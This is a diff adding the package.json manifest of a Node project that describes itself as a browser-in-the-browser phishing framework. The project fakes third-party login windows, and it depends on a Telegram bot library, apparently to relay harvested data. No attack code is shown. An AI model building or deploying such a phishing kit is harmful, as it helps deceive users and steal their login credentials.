@@ -1,0 +1,18 @@
+{
+  "name": "bitb-framwork",
+  "version": "1.0.0",
+  "description": "**bitb stands for browser in the browser attack . it just a more of the advance phishing techniuqe used to phis the user making them belive that a new third party  authentication windows is open . but it is just using `<ifram>`tag from the html and with magic of some javascript and css , it makes more belivable. you can look at the image provided from mrd0x , to read more you can visit : https://mrd0x.com/browser-in-the-browser-phishing-attack/ **",
+  "main": "script.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "start": "node bot.js"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "type": "module",
+  "dependencies": {
+    "node-telegram-bot-api": "^0.61.0",
+    "dotenv": "^16.4.5"
+  }
+}
